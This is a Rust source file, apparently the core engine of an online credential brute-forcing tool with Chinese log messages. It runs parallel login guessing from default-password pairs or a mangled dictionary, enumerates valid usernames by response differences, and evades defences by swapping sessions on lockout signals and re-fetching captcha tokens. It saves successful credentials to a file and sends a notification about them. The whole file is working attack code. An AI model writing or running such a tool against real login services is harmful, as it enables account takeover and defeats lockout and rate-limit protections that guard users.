#![forbid(unsafe_code)]

use std::collections::BTreeMap;
use std::fs::{self, File};
use std::io::{BufRead, BufReader, Seek, SeekFrom};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::mpsc::Sender;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use reqwest::StatusCode;

use crate::auth::Auth;
use crate::gate::Gate;
use crate::judge::{Judge, Verdict};
use crate::session::Session;
use crate::Args;

const PROGRESS_EVERY: u64 = 500;
const SAVE_EVERY: u64 = 200;
const THROTTLE_MAX: u32 = 8;

pub struct Engine {
    pub session: Arc<Session>,
    pub auth: Auth,
    pub judge: Judge,
    pub gate: Option<Arc<Gate>>,
    worker_count: usize,
    interval_ms: u64,
    offset_path: PathBuf,
    resume: bool,
    lockout_wait: u64,
    retry: u32,
    mangle: Option<String>,
    hit: AtomicBool,
    attempts: AtomicU64,
    notify: Sender<String>,
    last_req: Mutex<Instant>,
    errs: Mutex<u32>,
    last_err: Mutex<Instant>,
    hits: Mutex<Vec<String>>,
}

impl Engine {
    pub fn new(
        args: &Args,
        session: Arc<Session>,
        auth: Auth,
        judge: Judge,
        gate: Option<Arc<Gate>>,
        notify: Sender<String>,
    ) -> anyhow::Result<Self> {
        Ok(Self {
            session,
            auth,
            judge,
            gate,
            worker_count: args.workers.max(1),
            interval_ms: args.interval_ms.unwrap_or(0),
            offset_path: PathBuf::from(&args.offset_file),
            resume: args.resume,
            lockout_wait: args.lockout_wait,
            retry: args.retry,
            mangle: args.mangle.clone(),
            hit: AtomicBool::new(false),
            attempts: AtomicU64::new(0),
            notify,
            last_req: Mutex::new(Instant::now() - Duration::from_secs(3600)),
            errs: Mutex::new(0),
            last_err: Mutex::new(Instant::now() - Duration::from_secs(3600)),
            hits: Mutex::new(Vec::new()),
        })
    }

    pub fn attempts(&self) -> u64 {
        self.attempts.load(Ordering::Relaxed)
    }

    pub fn is_hit(&self) -> bool {
        self.hit.load(Ordering::SeqCst)
    }

    pub fn hits(&self) -> Vec<String> {
        self.hits.lock().unwrap().clone()
    }

    /// 内存口令表（默认口令分类）
    pub async fn run_pairs(self: &Arc<Self>, pairs: Vec<(String, String)>) -> anyhow::Result<bool> {
        let src = Arc::new(Mutex::new((pairs, 0usize)));
        self.parallel(move || {
            let mut g = src.lock().unwrap();
            let item = g.0.get(g.1).cloned();
            if item.is_some() {
                g.1 += 1;
            }
            item
        })
        .await
    }

    /// 流式字典（支持 --mangle 变换）
    pub async fn run_dict(self: &Arc<Self>, path: &str) -> anyhow::Result<bool> {
        let user = self.auth_user();
        let inner = Mutex::new(DictInner::open(path, self.resume, &self.offset_path)?);
        let mangle = self.mangle.clone();
        let pending: Mutex<Vec<String>> = Mutex::new(Vec::new());
        self.parallel(move || {
            let mut d = inner.lock().unwrap();
            let mut p = pending.lock().unwrap();
            if let Some(x) = p.pop() {
                return Some((user.clone(), x));
            }
            let Some(line) = d.next() else {
                return None;
            };
            if let Some(m) = &mangle {
                let mut v = variants(&line, m);
                v.reverse();
                if let Some(first) = v.pop() {
                    *p = v;
                    return Some((user.clone(), first));
                }
            }
            Some((user.clone(), line))
        })
        .await
    }

    /// 用户枚举: 固定错误密码, 按响应(状态码+正文哈希)分组
    pub async fn run_enum(self: &Arc<Self>, path: &str) -> anyhow::Result<bool> {
        let users: Vec<String> = fs::read_to_string(path)?
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        eprintln!("[enum] {} 个用户", users.len());
        let idx = Arc::new(Mutex::new(0usize));
        let groups: Arc<Mutex<BTreeMap<u64, Vec<String>>>> = Arc::new(Mutex::new(BTreeMap::new()));
        let mut tasks = Vec::new();
        for _ in 0..self.worker_count {
            let e = self.clone();
            let idx = idx.clone();
            let groups = groups.clone();
            let users = users.clone();
            tasks.push(tokio::spawn(async move {
                loop {
                    let i = {
                        let mut g = idx.lock().unwrap();
                        let i = *g;
                        *g += 1;
                        i
                    };
                    let Some(user) = users.get(i) else { return };
                    let cap = e.current_cap().await;
                    let client = e.session.client().await;
                    if let Ok(req) = e.auth.request(&client, "xEnumerate@1", cap.as_deref()) {
                        if let Ok(resp) = req.send().await {
                            let status = resp.status().as_u16();
                            let text = resp.text().await.unwrap_or_default();
                            let mut h = std::collections::hash_map::DefaultHasher::new();
                            use std::hash::{Hash, Hasher};
                            status.hash(&mut h);
                            text.hash(&mut h);
                            groups
                                .lock()
                                .unwrap()
                                .entry(h.finish())
                                .or_default()
                                .push(user.clone());
                        }
                    }
                }
            }));
        }
        for t in tasks {
            t.await?;
        }
        let g = groups.lock().unwrap();
        println!("[enum] 响应分组: {} 组", g.len());
        for (k, users) in g.iter() {
            println!("   组 {:016x} ({} 人): {}", k, users.len(), users.join(", "));
        }
        if g.len() > 1 {
            println!("[enum] 响应存在差异，疑似存在可枚举用户");
        } else {
            println!("[enum] 所有用户响应一致，无枚举差异");
        }
        Ok(false)
    }

    fn auth_user(&self) -> String {
        match &self.auth {
            Auth::Get { user, .. } | Auth::Form { user, .. } | Auth::Json { user, .. } => {
                user.clone()
            }
            Auth::Basic { user, .. } => user.clone(),
        }
    }

    async fn parallel<F>(self: &Arc<Self>, next: F) -> anyhow::Result<bool>
    where
        F: FnMut() -> Option<(String, String)> + Send + 'static,
    {
        let next = Arc::new(Mutex::new(next));
        let mut tasks = Vec::new();
        for _ in 0..self.worker_count {
            let e = self.clone();
            let nx = next.clone();
            tasks.push(tokio::spawn(async move { e.worker(&nx).await }));
        }
        for t in tasks {
            t.await?;
        }
        Ok(self.is_hit())
    }

    async fn worker<F>(self: &Arc<Self>, next: &Arc<Mutex<F>>)
    where
        F: FnMut() -> Option<(String, String)>,
    {
        loop {
            if self.is_hit() {
                return;
            }
            let item = next.lock().unwrap()();
            let Some((user, pass)) = item else {
                return;
            };
            if self.attempt(&user, &pass).await {
                self.hit.store(true, Ordering::SeqCst);
                return;
            }
        }
    }

    async fn attempt(&self, user: &str, pass: &str) -> bool {
        for _round in 0..=self.retry {
            if self.is_hit() {
                return false;
            }
            self.rate_limit().await;

            let cap = self.current_cap().await;
            let client = self.session.client().await;
            let req = match self.auth.request(&client, pass, cap.as_deref()) {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("[auth] {e}");
                    return false;
                }
            };
            let n = self.attempts.fetch_add(1, Ordering::Relaxed) + 1;
            if n % PROGRESS_EVERY == 0 {
                eprintln!("[进度] {n} 次  当前 {user}:{pass}");
            }

            match req.send().await {
                Err(e) => {
                    eprintln!("[net] {e}");
                    self.throttle().await;
                }
                Ok(resp) => {
                    let status = resp.status();
                    let url = resp.url().to_string();
                    let headers = resp.headers().clone();
                    let text = resp.text().await.unwrap_or_default();
                    self.session.capture(&url, &headers);

                    match self.judge.verdict(status.as_u16(), &text) {
                        Verdict::Gate => {
                            eprintln!("[gate] 触发闸门信号，重新取码");
                            if let Some(g) = &self.gate {
                                g.reset(&self.session).await;
                            }
                        }
                        Verdict::Lockout => {
                            eprintln!(
                                "[session] 锁定信号 → 换新会话，冷却 {}s",
                                self.lockout_wait
                            );
                            self.session.swap_fresh();
                            if let Some(g) = &self.gate {
                                g.reset(&self.session).await;
                            }
                            tokio::time::sleep(Duration::from_secs(self.lockout_wait)).await;
                        }
                        Verdict::Success => {
                            self.report_hit(user, pass, status.as_u16(), &text).await;
                            return true;
                        }
                        Verdict::Fail | Verdict::Neutral => {
                            if matches!(
                                status,
                                StatusCode::TOO_MANY_REQUESTS
                                    | StatusCode::SERVICE_UNAVAILABLE
                                    | StatusCode::BAD_GATEWAY
                                    | StatusCode::GATEWAY_TIMEOUT
                            ) {
                                self.throttle().await;
                                continue; // 限流重试同一口令
                            }
                            self.note_ok().await;
                            return false;
                        }
                    }
                }
            }
        }
        eprintln!("[skip] {user}:{pass} 三轮未通过");
        false
    }

    async fn report_hit(&self, user: &str, pass: &str, status: u16, text: &str) {
        let flags = self.judge.flags(text);
        let msg = format!("[HIT] {user}:{pass} status={status}");
        println!("\n===== {msg} =====");
        let shown: String = text.chars().take(2000).collect();
        println!("{shown}");
        println!("==========");
        if !flags.is_empty() {
            println!("FLAG: {}", flags.join(" | "));
        }
        self.hits
            .lock()
            .unwrap()
            .push(format!("{user}:{pass} status={status} flags={flags:?}"));
        let mut s = fs::read_to_string("hit.txt").unwrap_or_default();
        s.push_str(&format!("{msg} flags={flags:?}\n"));
        let _ = fs::write("hit.txt", s);
        let _ = self
            .notify
            .send(format!("命中 {user}:{pass} [{status}] {flags:?}"));
    }

    async fn current_cap(&self) -> Option<Vec<(String, String)>> {
        match &self.gate {
            Some(g) => g.get(&self.session).await,
            None => None,
        }
    }

    async fn rate_limit(&self) {
        if self.interval_ms == 0 {
            return;
        }
        let dur = Duration::from_millis(self.interval_ms);
        let el = {
            let l = self.last_req.lock().unwrap();
            l.elapsed()
        };
        if el < dur {
            tokio::time::sleep(dur - el).await;
        }
        *self.last_req.lock().unwrap() = Instant::now();
    }

    async fn throttle(&self) {
        let e = {
            let mut e = self.errs.lock().unwrap();
            *e = e.saturating_add(1).min(THROTTLE_MAX);
            *e
        };
        let wait = Duration::from_secs(1).saturating_mul(1u32 << e);
        *self.last_err.lock().unwrap() = Instant::now();
        eprintln!("[throttle] 连续错误 {e} 次，退避 {wait:?}");
        tokio::time::sleep(wait).await;
    }

    async fn note_ok(&self) {
        let fresh = self.last_err.lock().unwrap().elapsed() > Duration::from_secs(10);
        if fresh {
            *self.errs.lock().unwrap() = 0;
        }
    }
}

struct DictInner {
    reader: BufReader<File>,
    pos: u64,
    saw: u64,
    offset_path: PathBuf,
}

impl DictInner {
    fn open(path: &str, resume: bool, offset_path: &PathBuf) -> anyhow::Result<Self> {
        let mut f = File::open(path)?;
        let saved = if resume {
            fs::read_to_string(offset_path)
                .ok()
                .and_then(|s| s.trim().parse::<u64>().ok())
        } else {
            None
        };
        if let Some(off) = saved {
            f.seek(SeekFrom::Start(off))?;
            eprintln!("[resume] 从字节 {off} 续跑");
        }
        Ok(Self {
            reader: BufReader::new(f),
            pos: saved.unwrap_or(0),
            saw: 0,
            offset_path: offset_path.clone(),
        })
    }

    fn next(&mut self) -> Option<String> {
        loop {
            let mut line: Vec<u8> = Vec::new();
            let n = self.reader.read_until(b'\n', &mut line).ok()?;
            if n == 0 {
                let _ = fs::remove_file(&self.offset_path);
                return None;
            }
            self.pos += n as u64;
            let s = String::from_utf8_lossy(&line);
            let s = s.trim_end_matches(['\n', '\r']);
            if s.is_empty() {
                continue;
            }
            self.saw += 1;
            if self.saw % SAVE_EVERY == 0 {
                let _ = fs::write(&self.offset_path, self.pos.to_string());
            }
            return Some(s.to_string());
        }
    }
}

/// 字典变换: 原样 + 大小写变体 / 数字符号后缀
fn variants(base: &str, mode: &str) -> Vec<String> {
    let mut v = vec![base.to_string()];
    match mode {
        "case" | "all" => {
            let lower = base.to_lowercase();
            let upper = base.to_uppercase();
            let mut caps = lower.clone();
            if let Some(c) = caps.get_mut(0..1) {
                c.make_ascii_uppercase();
            }
            for x in [lower, caps, upper] {
                if !v.contains(&x) {
                    v.push(x);
                }
            }
        }
        _ => {}
    }
    match mode {
        "suffix" | "all" => {
            for s in ["1", "12", "123", "1234", "123456", "!", "@", "123!", "123456!", "2024", "2025", "2026"] {
                let c = format!("{base}{s}");
                if !v.contains(&c) {
                    v.push(c);
                }
            }
        }
        _ => {}
    }
    v
}